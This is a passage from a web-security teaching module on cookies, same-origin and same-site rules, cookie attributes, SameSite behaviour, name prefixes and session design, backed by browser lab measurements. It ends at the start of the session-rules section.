<!-- markdownlint-disable MD001 -->
<!-- markdownlint-disable MD024 -->
<!-- markdownlint-disable MD025 -->
<!-- markdownlint-disable MD026 -->
<!-- markdownlint-disable MD029 -->
<!-- markdownlint-disable MD033 -->
<!-- markdownlint-disable MD036 -->
<!-- markdownlint-disable MD040 -->
<!-- markdownlint-disable MD056 -->
<!-- markdownlint-disable MD060 -->

# H10. State on a stateless protocol: cookies

---

## Contents

| #     | Sub-topic                                                                         | Tag   |
| ----- | --------------------------------------------------------------------------------- | ----- |
| 10.01 | Origin, site and the same-origin policy                                           | CORE  |
| 10.02 | Cookies on the wire: `Set-Cookie`, `Cookie`, attributes, `SameSite`, prefixes     | CORE  |
| 10.03 | Sessions and tokens: server-side state against self-contained state               | CORE  |
| 10.04 | Attacks and the attribute that defends against each: fixation, CSRF, XSS, tossing | CORE  |
| 10.05 | Third-party cookies and where they stand                                          | AWARE |
| 10.06 | CORS in one page: preflight and credentialed requests                             | CORE  |
| 10.07 | The story: one login across a shop, its API and its blog                          | CORE  |
| 10.08 | Labs: what each one shows and how to run it                                       | CORE  |
| 10.09 | Exercises                                                                         |       |
| 10.10 | Solutions                                                                         |       |
| 10.11 | Takeaways                                                                         |       |

Terms used throughout. Each is defined here, before any section uses it:

- **State** and **stateless protocol**: state is information a server must remember between requests: who is logged in, what is in the cart.  
  HTTP is a stateless protocol: each request carries what the server needs to interpret it and the protocol links no two requests together.
  Applications that need memory add it on top.

- **Cookie**, **cookie jar**, **`Set-Cookie`**, **`Cookie`**: a cookie is a name and a value, plus attributes that control its scope and lifetime, which a server asks a browser to store.  
  The browser's store of them is the cookie jar.  
  The server sends one `Set-Cookie` response field per cookie to create or change it, and the browser returns the matching cookies, by itself, in a single `Cookie` request field.

- **Session** and **session identifier**: a session is the server's record of one visit: who the user is, what is in the cart, when it started.  
  The session identifier (session id) is the random string that names that record.  
  The cookie usually carries the identifier, and the record stays on the server.

- **Origin**, **site**, **registrable domain**: an origin is the triple *scheme, host, port* of a URL, such as `https://shop.example.com:443`.  
  A site is the scheme plus the **registrable domain**, which is the host's **public suffix** plus one more label: for `shop.example.com` the public suffix is `com` and the registrable domain is `example.com`.  
  A public suffix is a name under which unrelated parties register their own names: `com`, `co.uk`, and also `github.io`, under which every GitHub user has a page.  
  The **public suffix list** is the community-maintained list of them (publicsuffix.org) that browsers ship with.  
  It is the reason `example.co.uk` and `other.co.uk` are different sites.

- **Same-origin**, **cross-origin**, **same-site**, **cross-site**: two URLs are same-origin if scheme, host and port are all equal, and same-site if their sites are equal.  
  Cross-origin and cross-site are the negations.  
  Same-site is the looser relation: every same-origin pair is same-site, and `https://shop.example.com` and `https://api.example.com` are same-site but cross-origin.

- **Top-level navigation**, **subresource**, **top-level site**: a top-level navigation changes the page shown in the browser's address bar: typing a URL, clicking a link, submitting a form that replaces the page.  
  A subresource request is one that a page makes for something inside itself: an image, a script, an `<iframe>`, a `fetch` call.  
  The top-level site is the site of the page in the address bar.  
  A request is **first-party** when its target is same-site with the top-level site and **third-party** when it is not.

- **Same-origin policy** (SOP): the browser rule that a page may freely send requests to other origins but may read only responses and data from its own origin.  
  10.01 states it precisely.

- **Ambient authority**: a credential the browser attaches to a request on its own, without the page's code asking for it.  
  Cookies are ambient. A token that the page's code must read and add to a request by hand is not.  
  This difference drives the whole attack section.

- **XSS** (cross-site scripting): an attacker gets a script of their choosing to run inside the victim's page on the victim site, because the site copied attacker-supplied text into HTML without escaping it.  
  **CSRF** (cross-site request forgery): a page on another site makes the victim's browser send a request to the target site, and the browser attaches the victim's cookies, so the request arrives looking like the user's own.  
  **Session fixation**: the attacker makes the victim use a session id the attacker already knows, then waits for the victim to log in under it.  
  **Cookie tossing**: a page on a sibling subdomain plants a cookie that the target site's server will read.

- **Bearer credential**: a credential that identifies whoever holds it, with no further proof.  
  A session id and a self-contained token are both bearer credentials: stolen once, they work for the thief until they expire or are revoked.

- **MAC**, **HMAC**, **signature**: a message authentication code (MAC) is a short tag computed from a message and a secret key.  
  Only a holder of the key can compute a valid tag for a given message, so a matching tag shows that the message came from a key holder and was not altered.  
  HMAC-SHA256 is the common MAC, built from the hash function SHA-256; H11 explains how.  
  A signed token carries its claims together with their tag.

- **CSPRNG**: a cryptographically secure pseudorandom number generator, the operating system's source of unpredictable bytes (`/dev/urandom`, Java's `SecureRandom`, Rust's `OsRng`).  
  Anything an attacker must not guess, such as a session id, comes from one.  
  A counter, a timestamp or `Math.random()` is not one.

- **CORS** (cross-origin resource sharing), **simple request**, **preflight**: CORS is the mechanism by which a server tells browsers that a page from another origin may read its responses.  
  A simple request is one the browser sends at once (the shapes 10.06 lists).  
  Any other cross-origin request is held back while the browser sends a **preflight**, an `OPTIONS` request that asks the server whether the real request is allowed.

- **TLS** and **HTTPS**: TLS is the encryption layer under `https://` URLs (H11 to H16).  
  The only consequence used here is that on HTTPS an observer on the network path can neither read nor change the cookies in transit, and on plain `http://` they can do both.

- **Playwright** and **Chromium**: Chromium is the open-source browser engine behind Chrome and Edge.  
  Playwright is a library that drives it from a script, which is how the labs ask a real browser what it sends and what it hides.

Outputs in this module are real.  
They come from this module's own shop server, cookie jar and token program, each written twice (Java and Rust), from Chromium 153 driven by Playwright 1.63 on Node 22, and from `curl` 8.5.  
Run on Linux 6.18, JDK 21, Rust 1.97.  
Times and random identifiers differ on every run and are masked or marked where they appear.  
Everything else, including every browser decision shown, is the same on each run.

---

## 10.01 Origin, site and the same-origin policy

An origin is scheme, host and port. A site is scheme plus registrable domain.  
The same-origin policy says a page may *send* requests to any origin but may *read* only what comes from its own: it can load an image from anywhere and cannot look inside it,  
it can submit a form anywhere and cannot read the answer, it can embed a bank in an `<iframe>` and cannot look at the bank's page.  

Two consequences organise everything that follows. First, because sending is allowed, an attacker's page can make *your* browser send a request to your bank, and the browser will attach your cookies unless a cookie rule says otherwise (10.04).  
Second, the browser uses different boundaries for different things: the origin for reading data, the site for `SameSite`, the host for cookies, and the cookie boundary ignores the port.  
Mixing them up is the source of most cookie bugs.

### Comparing two URLs

The origin is compared field by field and the path is never part of it.  
The default port is filled in before comparing, so `https://shop.example.com` and `https://shop.example.com:443` are the same origin.  
Against the page `https://shop.example.com/cart`:

| The other URL                         | Same origin? | Same site? | Why                                                                          |
| ------------------------------------- | ------------ | ---------- | ---------------------------------------------------------------------------- |
| `https://shop.example.com/orders`     | yes          | yes        | Only the path differs                                                        |
| `https://shop.example.com:443/orders` | yes          | yes        | 443 is the default port of `https`                                           |
| `http://shop.example.com/cart`        | no           | no         | Different scheme. Same-site compares the scheme too (see below)              |
| `https://shop.example.com:8443/cart`  | no           | yes        | Different port. The site ignores the port                                    |
| `https://api.example.com/cart`        | no           | yes        | Different host, same registrable domain `example.com`                        |
| `https://example.com/`                | no           | yes        | The parent domain is a different host of the same site                       |
| `https://shop.example.org/`           | no           | no         | Registrable domain `example.org` differs                                     |
| `https://shop.example.com.evil.net/`  | no           | no         | Registrable domain is `evil.net`. A prefix match on the host would be fooled |

Two more rows, on a page `https://alice.github.io/`: `https://bob.github.io/` is cross-site because `github.io` is a public suffix, so the registrable domains are `alice.github.io` and `bob.github.io`;  
and `https://other.co.uk/` against `https://example.co.uk/` is cross-site because `co.uk` is a public suffix.  

Without the public suffix list, every pair on `github.io` would count as one site, and a cookie set by one user's page for `Domain=github.io` would reach every other user.

The scheme is part of the site in the current definition, which is called **schemeful same-site**: `http://shop.example.com` and `https://shop.example.com` are cross-site for `SameSite` purposes,  
so a downgrade to plain HTTP cannot ride on the cookies of the secure page.  

This is from the draft specification and the lab's cookie jar (Lab 03 part B, item 7); the Chromium lab does not exercise a scheme change because it has no TLS.

The lab renders the table above for real.  
Lab 01 asks Chromium to load a page and request six URLs, and reads the `Sec-Fetch-Site` field the browser attaches,  
which is the browser's own verdict on the relation (`same-origin`, `same-site`, `cross-site`):

```mermaid
flowchart TD
    A["Page from origin A runs fetch to origin B"] --> B{"Same origin?"}
    B -- yes --> C["Request sent, response readable"]
    B -- no --> D["Browser still sends a simple request, with the cookies the SameSite rules allow"]
    D --> E["Server runs it and answers"]
    E --> F{"Does the response name A in Access-Control-Allow-Origin?"}
    F -- yes --> G["Script may read the response"]
    F -- no --> H["Browser hides the response and the script gets a network error"]
```

### What the policy blocks and what it allows

The policy is about *reading*. The things it keeps a cross-origin page from doing, and the things it lets through:

| Action by a page on origin A against origin B             | Allowed?               | Notes                                                                               |
| --------------------------------------------------------- | ---------------------- | ----------------------------------------------------------------------------------- |
| `fetch`/`XMLHttpRequest` to B, read the response          | No, unless B opts in   | The opt-in is CORS (10.06). The request itself is sent for simple requests          |
| `<img src>`, `<link rel=stylesheet>`, `<script src>`      | Yes, to display or run | The page cannot read the bytes, but a script it loads *runs with A's full powers*   |
| `<form action=B method=POST>` submitted by the page       | Yes                    | The browser navigates to B's answer. No preflight. This is the classic CSRF vehicle |
| `<iframe src=B>`                                          | Yes, to display        | B can refuse with `X-Frame-Options` or CSP `frame-ancestors`. A cannot read inside  |
| `iframe.contentDocument` or `contentWindow.document` of B | No                     | `contentDocument` is `null`, `contentWindow.document` throws `SecurityError`        |
| Canvas pixels of a cross-origin image                     | No                     | The canvas becomes "tainted" and refuses to export                                  |
| `localStorage`, `IndexedDB` of B                          | No                     | Each origin has its own                                                             |
| Cookies of B                                              | Not by script          | Cookies are not keyed by origin at all: they follow host, path and `Secure` (10.02) |

Lab 01 part B shows the first and fifth rows in Chromium.  
A script on `evil.localhost` fetching the shop's `/echo` page fails with `TypeError: Failed to fetch`.  
With `mode: 'no-cors'` the request is sent and the answer comes back as an *opaque* response: `type=opaque status=0 body length=0`, a response that exists but that script cannot see into.  
The `<iframe>` check gives `contentDocument is null` and `SecurityError`.  
The last line of the part is the point of the section: three requests were made, and all three reached the shop with `Sec-Fetch-Site: cross-site`.  
The policy hid the answers. It did not stop the requests.

### Each boundary has a different unit

| Mechanism                                           | The unit it uses                              | Evidence                                                           |
| --------------------------------------------------- | --------------------------------------------- | ------------------------------------------------------------------ |
| Reading a response (SOP, CORS)                      | Origin (scheme, host, port)                   | Lab 01 part B, Lab 07                                              |
| `localStorage`, `IndexedDB`                         | Origin                                        | Browser behaviour, not exercised                                   |
| Which cookies a request carries                     | Host and path of the *request*, plus `Secure` | Lab 01 part C: a cookie set through port 9400 is sent to port 9401 |
| Whether a cookie is sent cross-context (`SameSite`) | Site (scheme plus registrable domain)         | Lab 03                                                             |
| Isolating third-party embeds                        | The pair (top-level site, embedded site)      | Lab 06, `Partitioned` cookies                                      |

The third row deserves its own sentence. Cookies were designed before the origin concept existed, and they ignore the port.  
Lab 01 part C sets a cookie through the shop on port 9400 and requests the shop on port 9401: the cookie goes along.  
Two services that share a host name and differ only in port share their cookies, which is a reason never to run something of different trust on another port of the same host.

### Headers the browser adds so that servers can see the relation

A server can ask the browser what the relation is, because the browser attaches fields that page script cannot set or forge  
(they are on the **forbidden header** list; `curl` can send any value, so these fields defend against browsers and not against scripts or other tools):

| Field            | What it carries                                                                                                                                                                                                               |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Origin`         | The origin of the page that triggered the request. Sent on CORS requests and on every request whose method is not `GET` or `HEAD`, so on form posts, same-origin or not. A plain cross-origin `GET` for an image carries none |
| `Referer`        | The full URL of the page, or less, per the page's referrer policy. Often trimmed or absent                                                                                                                                    |
| `Sec-Fetch-Site` | `same-origin`, `same-site`, `cross-site`, or `none` (the user typed the URL or used a bookmark)                                                                                                                               |
| `Sec-Fetch-Mode` | `cors`, `no-cors`, `navigate`, `same-origin`, `websocket`                                                                                                                                                                     |
| `Sec-Fetch-Dest` | What the response will be used as: `document`, `image`, `script`, `iframe`, `empty` (for `fetch`)                                                                                                                             |

Lab 05 uses `Sec-Fetch-Site` and `Origin` as server-side defences and shows both work against the browser attack and say nothing about a request from `curl`.  
H08 showed the same `Origin` field on the WebSocket handshake, where the browser sends it and the *server* has to check it, because CORS does not cover WebSocket.

### The one hole in the origin: DNS

An origin is a name, so whoever controls what the name resolves to controls what the policy protects.  
In a **DNS rebinding** attack the attacker's domain first resolves to the attacker's server, which delivers a script; the name is then re-pointed, with a very short TTL (H03),  
at an address inside the victim's network, for instance the router or a developer's local service on `127.0.0.1`.  

The script now talks to that service, and the browser considers it the same origin as the page, so the answers are readable.  
The defence is on the target: check the `Host` header and refuse names you do not serve, which is why development servers that answer to any `Host` are exploitable from a malicious web page.  
The shop server of this module answers to every host name on purpose, because the labs need `shop.localhost`, `evil.localhost` and the rest; that is a lab convenience, not a pattern for a server.

### Interview angle

- *"Is `api.example.com` the same origin as `example.com`? The same site?"*  
  Different origin (host differs), same site (same registrable domain).  
  That is why `SameSite` cookies do not stop a request from one to the other, and why CORS does apply.

- *"Does the same-origin policy stop CSRF?"*  
  No.  
  The policy stops reading; CSRF needs only sending.  
  A cross-site form `POST` goes out with the victim's cookies and the attacker never needs to read the answer.

- *"Why does a cookie set for `shop.example.com:8443` reach `shop.example.com:443`?"*  
  Cookies ignore the port; their scope is host, path and scheme (through `Secure`).  
  Origin is the unit for script access, not for cookies.

- *"What is a public suffix and why does the browser need a list?"*  
  A name under which unrelated parties register (`co.uk`, `github.io`).  
  The browser needs the list to refuse `Domain=co.uk` cookies and to know that two `github.io` pages are cross-site.  
  The list is data, not computable from the name.

---

## 10.02 Cookies on the wire: `Set-Cookie`, `Cookie`, attributes, `SameSite`, prefixes

A server creates a cookie with a `Set-Cookie` response field: `Set-Cookie: sid=abc123; Path=/; Secure; HttpOnly; SameSite=Lax`.  
Each cookie needs its own field; they cannot be combined, because the `Expires` date contains a comma (H07).  
The browser stores the cookie in its jar with the scope the attributes describe, and on later requests it sends every cookie whose scope matches in one `Cookie` field containing only names and values: `Cookie: theme=dark; sid=abc123`.  
The server never sees the attributes. It cannot tell whether a cookie is `Secure`, which `Domain` it was set for, or, when two cookies share a name, which is which.  
The attributes are instructions to the browser, and the browser alone enforces them.  
They are: `Domain` and `Path` (scope), `Expires` and `Max-Age` (lifetime), `Secure` (HTTPS only), `HttpOnly` (hidden from scripts), `SameSite` (when to send it across sites), `Partitioned` (separate jar per top-level site, 10.05).  
Name prefixes (`__Host-`, `__Secure-`) let a server demand some of these rules through the cookie's name.  
The governing text is RFC 6265 (2011), updated by RFC 6265bis, which on 2026-10-28 is still an Internet-Draft, revision -22, in the RFC Editor queue and not yet published as an RFC.  
Browsers implement it as written in the draft and the module names the draft where it differs from 6265.

### The two fields

```mermaid
sequenceDiagram
    participant B as Browser
    participant S as Shop server
    B->>S: GET /login-page
    S->>B: 200, Set-Cookie theme=dark with Max-Age 3600, Set-Cookie sid=abc123 with HttpOnly
    Note over B: two fields, two cookies, stored in the jar with their scope
    B->>S: GET /account, Cookie theme=dark and sid=abc123 in one field
    Note over S: sees names and values only, no attributes
    B->>S: GET /logout
    S->>B: 200, Set-Cookie sid empty with Max-Age 0
    Note over B: same name, domain and path, so the old cookie is removed
```

Lab 02 part A shows every one of those messages with `curl`.  
The first request makes the shop send two cookies and the response carries two separate fields:

```text
< Set-Cookie: theme=dark; Path=/; Max-Age=3600
< Set-Cookie: sid=abc123; Path=/; HttpOnly; SameSite=Lax
```

The next request sends them back as one field, `Cookie: theme=dark; sid=abc123`.  
A hand-written request can repeat a name (`sid=abc123; theme=dark; theme=light`); the server sees both, in the order sent, and has to decide which to use.  
That ambiguity is what cookie tossing exploits in 10.04.

### The attributes

| Attribute                               | What it does                                                                         | Default if absent                               | Defends against / used for                                   |
| --------------------------------------- | ------------------------------------------------------------------------------------ | ----------------------------------------------- | ------------------------------------------------------------ |
| `Domain=example.com`                    | Cookie goes to `example.com` and every subdomain. A leading dot is ignored           | **Host-only**: exactly the setting host         | Needed for single sign-on across subdomains. Widens exposure |
| `Path=/app`                             | Cookie goes to this path and below. `/app` matches `/app` and `/app/x`, not `/apple` | Directory of the setting URL's path             | Organisation only. **Not a security boundary** (below)       |
| `Max-Age=3600`                          | Lifetime in seconds from now. `0` or negative deletes                                | Session cookie                                  | Lifetime. Wins over `Expires` when both are present          |
| `Expires=Thu, 05 Nov 2026 12:00:00 GMT` | Absolute expiry in an HTTP date                                                      | Session cookie                                  | Same, with a clock-skew risk. Prefer `Max-Age`               |
| `Secure`                                | Send only over HTTPS. Browsers also refuse to *set* it from a plain-HTTP URL         | Sent over HTTP too                              | Sniffing and tampering on plaintext connections              |
| `HttpOnly`                              | Hide from `document.cookie` and other script APIs. Still sent in requests            | Readable by scripts                             | Theft of the cookie by XSS. Not abuse of it                  |
| `SameSite=Strict`, `Lax`, `None`        | Controls whether the cookie travels on cross-site requests (below)                   | Treated as `Lax` in Chromium, with an exception | CSRF, partly                                                 |
| `Partitioned`                           | Store a separate copy per top-level site (CHIPS, 10.05). Requires `Secure`           | Unpartitioned                                   | Third-party tracking, while keeping embedded widgets working |

A **session cookie** is one with neither `Max-Age` nor `Expires`: the browser keeps it until it decides the session is over, which for modern browsers that restore tabs can be much longer than closing the window.  
Do not count on it for expiry; enforce expiry on the server (10.03).  
Every other lifetime is capped: Chromium, and the draft, limit a cookie to 400 days whatever the server asks for.  
In the jar of Lab 02, `Max-Age=99999999999` becomes `expires in 34560000 s`, which is 400 days.

**Host-only against `Domain`.** A cookie set without `Domain` belongs to the exact host that set it.  
A cookie set with `Domain=shop.example.com` (or its parent) belongs to that host *and all its subdomains*, and so is readable by, and settable from, any of them.  
Setting `Domain` is therefore a decision to trust every subdomain, including ones created later and ones that serve other people's content.  
Lab 02 part A, step 07: `hostonly=1` set without `Domain` and `wide=1` set with `Domain=shop.localhost`; a request to `api.shop.localhost` carries only `wide=1`.  
The browser also refuses to let a page set a cookie for a domain it is not part of: `Domain=blog.example.com` from `shop.example.com`, `Domain=evil.net`, or `Domain=com` or `Domain=co.uk`, because those are public suffixes.  
The jar in Lab 02 part B prints the reason for each refusal.

**Path is not a security boundary.** It narrows where the browser sends a cookie, and that is all.  
Any page on the same origin can read any path's cookies without help: it opens `/admin/` in a same-origin `<iframe>`, which the policy allows, and reads `document.cookie` from there.  
Use `Path` to keep unrelated applications on one host from clobbering each other's cookies, never to hide something.

**Deleting.** There is no delete instruction.  
A server removes a cookie by setting one with the *same name, same `Domain` and same `Path`* and a lifetime in the past (`Max-Age=0`, or an `Expires` in 1970).  
If the `Domain` or `Path` differs, the browser sees a different cookie and the old one stays. Lab 02 part A step 04 deletes `theme` and the next request carries only `sid`.  
The jar prints `removed` for a match and `ignored: already expired, and there was nothing to remove` for a delete that matches nothing.

### What the browser does with each header

Storing (the arrival of a `Set-Cookie` field) and sending (the construction of a request) are two algorithms.  
Both are small enough to hold in your head, and the teaching jar of Lab 02 implements them step by step and prints the reason for every decision.

```mermaid
flowchart TD
    A["Set-Cookie field arrives"] --> B["Parse: name, value, attributes. Unknown attributes ignored, invalid Max-Age or Expires ignored"]
    B --> C{"Domain given?"}
    C -- yes --> D{"Domain-matches the setting host and is not a public suffix?"}
    D -- no --> X["Ignore the cookie"]
    D -- yes --> E["Domain cookie"]
    C -- no --> F["Host-only cookie"]
    E --> G{"Secure set on a plain-HTTP URL, or HttpOnly set by a script?"}
    F --> G
    G -- yes --> X
    G -- no --> H{"SameSite=None without Secure, or a prefix rule violated?"}
    H -- yes --> X
    H -- no --> I{"Set from a cross-site context with SameSite other than None?"}
    I -- yes --> X
    I -- no --> J["Compute expiry: Max-Age first, then Expires, capped at 400 days"]
    J --> K{"Already expired?"}
    K -- yes --> L["Remove the cookie with the same name, domain, path and host-only flag, if any"]
    K -- no --> M{"Plain-HTTP URL and a Secure cookie with that name would be overwritten?"}
    M -- yes --> X
    M -- no --> N["Store, replacing a cookie with the same name, domain, path and host-only flag"]
```

The sending algorithm is a filter and a sort.  
For a request to a URL, take every cookie in the jar and keep it if all of these hold:

01. It has not expired.

02. The request host matches the cookie's domain: the same host for a host-only cookie, the same host or a subdomain for a `Domain` cookie.

03. The request path matches the cookie's path: equal, or the cookie's path is a prefix that ends at a `/`.

04. If the cookie is `Secure`, the request is HTTPS. (Chromium also treats `http://localhost` and `http://*.localhost` as secure, which the labs rely on.)

05. The `SameSite` rule admits the request's context (below).

06. If the request is a script reading `document.cookie`, the cookie is not `HttpOnly`.

Then sort: cookies with a longer path first, ties broken by earlier creation time, and join as `name=value` pairs with `;`.  
The draft tells servers not to rely on that order, and `curl` indeed sends a different one (Lab 02 part C).  
A server that has two cookies of one name and takes the first is relying on it anyway, which is the tossing attack of 10.04.

### Parsing details that matter

Lab 02 part B runs a list of odd `Set-Cookie` fields through the jar.  
The behaviours worth remembering, each confirmed against Chromium in part C:

- **Whitespace is trimmed and the first `=` splits.** `token =  x=y=z` stores the cookie `token` with value `x=y=z`. Attribute names are case-insensitive (`PATH=/a`, `secure`).

- **A field with no `=` is a cookie with an empty name** whose value is the whole text. `lonely-value` is stored and sent back as the bare string `lonely-value`.  
  RFC 6265 ignored such fields; the draft and Chromium keep them.  
  Servers and frameworks that split on `=` mishandle them, a recurring source of cookie-smuggling bugs.

- **`Max-Age` wins over `Expires`** when both are present, and an invalid value of either is ignored, leaving a session cookie: `Max-Age=soon` and `Expires=next tuesday` both store a session cookie.

- **The default path comes from the URL that set the cookie**, cut at the last `/`: a cookie set from `/shop/cart/add` with no `Path` has path `/shop/cart`, and one set from `/shop` has path `/`.  
  A `Path` that does not start with `/` is ignored and the default is used.  
  Always write `Path=/` explicitly, or the cookie will not follow the user from the page that set it to the rest of the site.

- **Value characters.** The standard allows no spaces, commas, semicolons, quotes or backslashes in a value; browsers accept more and keep `"a b"` with its quotes.  
  Put only base64url or hex in a value and the question never arises.

### Size limits

| Limit                       | Value                                                                                             | Evidence                                                                       |
| --------------------------- | ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| One cookie, name plus value | 4096 bytes                                                                                        | Lab 02 part D: 4096 stored, 4097 ignored. The cookie is dropped, not truncated |
| One attribute value         | 1024 bytes                                                                                        | In the draft; not exercised                                                    |
| Cookies per host name       | About 180 in Chromium                                                                             | Lab 02 part D: 200 sent in one response, 169 kept, the oldest evicted          |
| The whole `Cookie` field    | No cookie-level limit, but the server's header limit applies (commonly 8 KB, `431` beyond it, R4) | The 169 cookies sent next were 1350 bytes                                      |

Every matching cookie goes with **every** request to that host: the HTML, each script, each image, each `fetch`.  
This is the **cookie tax**. A 2 KB of cookies on a page that makes 60 requests is 120 KB of upload; Exercise 06 does the arithmetic.  
It is why static assets are served from a cookieless host or a cookieless path set, why a signed token in a cookie (10.03) costs more than a session id,  
and why analytics cookies set with `Domain=example.com` add bytes to every request on the whole site.

### SameSite

`SameSite` decides whether a cookie travels when the request is *cross-site*: the page that caused it belongs to a different site than the request's target.  
The decision depends on the request's kind as well as on the sites:

| Context of the request                                                        | `Strict` | `Lax` | `None` | Absent (Chromium) |
| ----------------------------------------------------------------------------- | -------- | ----- | ------ | ----------------- |
| Same site, any origin: `fetch`, `<img>`, link, form                           | sent     | sent  | sent   | sent              |
| Cross-site subresource: `<img>`, `<iframe>`, `fetch` with credentials         | no       | no    | sent   | no                |
| Cross-site top-level navigation by `GET`: a clicked link                      | no       | sent  | sent   | sent              |
| Cross-site top-level navigation by `POST`: a form, cookie under 2 minutes old | no       | no    | sent   | **sent**          |
| Cross-site top-level navigation by `POST`: a form, cookie over 2 minutes old  | no       | no    | sent   | no                |

Every cell is a measurement from Lab 03 part A: Chromium 153 was asked about eight contexts with four cookies each, and all 32 results equal the teaching jar's prediction.  
Reading it:

- **`Lax`** is the compromise: the cookie follows a user who *clicks a link* into your site, so they arrive logged in, and is withheld from everything a hostile page can trigger silently, such as images, `fetch` and form posts.  
  It still goes with a cross-site top-level `GET`, so any state change behind a `GET` (a "delete" link) remains forgeable (Lab 05: `transfer-get`).

- **`Strict`** is withheld from every cross-site request, including the click.  
  A user who follows a link to your shop from an email arrives *without* the cookie and sees the logged-out page until their next same-site navigation.  
  Use `Strict` for cookies guarding actions, not for the main session.

- **`None`** disables the protection and is accepted only together with `Secure`.  
  A `None` cookie is the only kind a third-party embed can use (10.05).

- **Absent** is `Lax` in Chromium, with a deliberate exception: a cookie *without any* `SameSite` attribute is still sent on a cross-site top-level `POST` for 2 minutes after it was set,  
  so that existing single-sign-on flows kept working when the default changed.  
  A cookie that says `Lax` explicitly gets no such window (Lab 03 part A, contexts 07 and 08).  
  By the web.dev guide the other engines differ: Firefox only behind a flag and Safari without the default, so state `SameSite` explicitly on every cookie and do not depend on a default.

- **`SameSite` is about the site, not the origin.** A request from `blog.shop.localhost` to `shop.localhost` is same-site.  
  All four `SameSite` settings, `Strict` included, let it through (Lab 05 part A2).  
  `SameSite` protects against other *sites*, not against a sibling subdomain.

A cookie can also be refused on *arrival* by the same rule: a response to a cross-site subresource request (an image, say) may not set a `Lax`, `Strict` or default cookie, only a `None; Secure` one.  
The jar in Lab 03 part B, item 9, shows all four cases.

### Name prefixes

A **cookie name prefix** is a name that starts with a reserved string.  
The browser then applies extra rules when it stores a cookie of that name, and refuses a cookie that breaks them.  
The rules cannot be forged, because the *name* is something the setting side must choose, and a cookie set by an insecure page or a sibling subdomain would break them.

| Prefix         | The browser refuses the cookie unless                      | In draft-22 | What it gives you                                                                |
| -------------- | ---------------------------------------------------------- | ----------- | -------------------------------------------------------------------------------- |
| `__Secure-`    | `Secure` is set and the cookie was set from an HTTPS URL   | yes         | An insecure page cannot plant or replace it                                      |
| `__Host-`      | `Secure`, `Path=/`, **no** `Domain`, set from an HTTPS URL | yes         | Locked to the exact host: a sibling subdomain can neither plant nor overwrite it |
| `__Http-`      | `Secure` and `HttpOnly`                                    | no          | A script cannot set or overwrite it                                              |
| `__Host-Http-` | The `__Host-` rules, and `HttpOnly`                        | no          | Both of the above                                                                |

The last two are newer. They are not in draft-22; Chromium 153 enforces them, as Lab 02 part E shows by probing 14 `Set-Cookie` fields and 3 script writes.  
Matching is case-insensitive: `__HOST-g=1; Secure; Path=/` was kept and `__host-h=1; Path=/` (no `Secure`) was refused.  
The prefix matters most for the session cookie: `Set-Cookie: __Host-sid=...; Secure; HttpOnly; Path=/; SameSite=Lax` is the strictest form a browser allows, and the one Lab 05 part C shows resisting tossing.  
Prefixes protect the cookie at *arrival*; they do not stop the sibling from setting a different-named cookie.

### Engines differ, and a server cannot see which

The teaching jar, Chromium and `curl` receive the same `Set-Cookie` fields in Lab 02 part C.  
The jar and Chromium produced identical results for every request of the three scenarios; `curl` differs in ways that matter when a test passes through `curl` and production does not:

| Behaviour                                    | Chromium 153 and the teaching jar        | `curl` 8.5                          |
| -------------------------------------------- | ---------------------------------------- | ----------------------------------- |
| Order of cookies in one `Cookie` field       | Longer path first, then earlier creation | A different order (all 11 requests) |
| A field with no `=`                          | Stored as a nameless cookie              | Dropped                             |
| `Max-Age=soon`                               | Session cookie                           | Dropped                             |
| `Secure` cookie from `http://shop.localhost` | Accepted (`localhost` names are secure)  | Dropped                             |
| `SameSite=None` without `Secure`             | Refused                                  | Accepted and sent                   |

None of these is a `curl` bug. `curl` is a general transfer tool with its own jar, and the cookie standard leaves some of this open.  
The lesson is that cookie behaviour is *client-specific*, and the client that counts is the browser. Test cookie logic in a browser.

### Interview angle

- *"Difference between `Domain=example.com` and no `Domain`?"*  
  No `Domain` makes the cookie host-only: it goes to exactly the setting host.  
  With `Domain` it goes to the domain and every subdomain, and any of them can set or overwrite it.  
  Prefer host-only; use `Domain` only for deliberate sharing, and then accept that every subdomain is trusted.

- *"What does `HttpOnly` protect against, and what does it not?"*  
  It stops a script from reading the cookie, so an XSS cannot exfiltrate the session id.  
  It does not stop the script from *using* the session (the browser attaches the cookie to the script's own requests), so it limits the damage and does not fix the XSS (Lab 05 part B).

- *"How do you delete a cookie?"*  
  Set a cookie with the same name, `Domain` and `Path` and `Max-Age=0`.  
  A mismatch in any of the three leaves the old cookie in place.

- *"What do `__Host-` cookies give you?"*  
  The browser enforces `Secure`, `Path=/` and no `Domain`, so the cookie is bound to one host and cannot be planted from a sibling subdomain or from HTTP.

- *"Why can't a server tell if a cookie is `Secure` or `HttpOnly`?"*  
  The `Cookie` field has only names and values.  
  Attributes are for the browser.  
  Security decisions must not depend on attributes the server cannot see.

---

## 10.03 Sessions and tokens: server-side state against self-contained state

A request that is meant to be recognised needs an identity attached, and there are two ways to build it.  
In a **server-side session**, the cookie holds only a random, meaningless id and the server holds the record: the id is a key into a store.  
In a **self-contained token**, the cookie holds the record itself, with a MAC (or signature) that proves the server issued it, so the server can recognise it without a store.  
The session is easy to revoke, small on the wire and needs a shared store once there is more than one server.  
The token needs no store, is slightly slower to check and larger, and cannot be revoked before it expires without bringing back server state.  
Both are bearer credentials: whoever holds the bytes is the user.  
Neither is "the stateless one" in the sense REST means: R1.3 and R2.4 forbid session state *on the server that changes the meaning of a request*, and a signed token moves that state into the request,  
while the session id keeps it behind a reference, which R2.4 lists as the pragmatic choice when instant revocation matters.  
Lab 04 builds both and measures them.

### Why HTTP needs either

Each request must be answerable alone (H07).  
To recognise a user, something they hold must travel in every request.  
That something can be a reference to state kept elsewhere, or the state itself, and the cookie is the transport that makes the browser add it without the page's code lifting a finger.

### The server-side session

```mermaid
sequenceDiagram
    participant B as Browser
    participant S as Shop server
    participant T as Session store
    B->>S: GET /, no cookie
    S->>T: create anonymous session A
    S->>B: Set-Cookie sid=A
    B->>S: POST /login with user and password, Cookie sid=A
    S->>S: password correct
    S->>T: delete A, create session B for alice
    S->>B: Set-Cookie sid=B, a new id
    B->>S: GET /account, Cookie sid=B
    S->>T: look up B
    T->>S: user alice
    S->>B: 200, alice's account
    B->>S: POST /logout, Cookie sid=B
    S->>T: delete B
    S->>B: Set-Cookie sid empty, Max-Age 0
```

The rules for doing it correctly are short, and each one answers a specific attack:

